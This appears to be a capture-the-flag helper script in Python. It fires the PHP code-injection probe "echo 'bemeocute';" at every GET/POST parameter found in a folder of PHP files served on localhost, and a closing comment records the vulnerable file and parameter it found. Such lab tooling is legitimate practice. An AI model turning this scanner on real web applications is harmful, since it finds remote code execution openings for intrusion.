# description: scan vulnerable params in lots of files

import re
import requests
import os
import time
import subprocess
from pwn import log, success

FOLDER_NAME = 'src'
SCANNED_FOLDER_NAME = 'scanned'
os.makedirs(SCANNED_FOLDER_NAME, exist_ok=True)

def exploit(file_name):
    log.info(f'Exploting {file_name}')

    with open(file_name, 'r') as f:
        content = f.read()
    request_method_list = re.findall('(?:GET|POST)\[.*\]', content)

    URL = f'http://localhost:8000/{os.path.basename(file_name)}'

    for request_method  in request_method_list:
        # log.info(f'Trying {request_method}')

        method = re.findall('^(.*)\[', request_method)[0]
        param = re.findall("\[.?'(.*).?'\]", request_method)[0]

        payload = {
            param: "echo 'bemeocute';"
        }

        if method == 'GET':
            r = requests.get(URL, params=payload)
        else:
            r = requests.post(URL, data=payload)

        if 'bemeocute' in r.text:
            success(f'Found: {request_method}')
            exit()
    
    os.system(f'mv {file_name} {os.path.join(SCANNED_FOLDER_NAME, os.path.basename(file_name))}')

p = subprocess.Popen(['alacritty', '-e', '/bin/bash', '-c', f'cd {FOLDER_NAME} && php -S localhost:8000'])
time.sleep(1)

files = os.listdir(FOLDER_NAME)
for file_name in files:
    exploit(os.path.join(FOLDER_NAME, file_name))

# file: xk0SzyKwfzw.php
# $_GET['Efa5BVG']
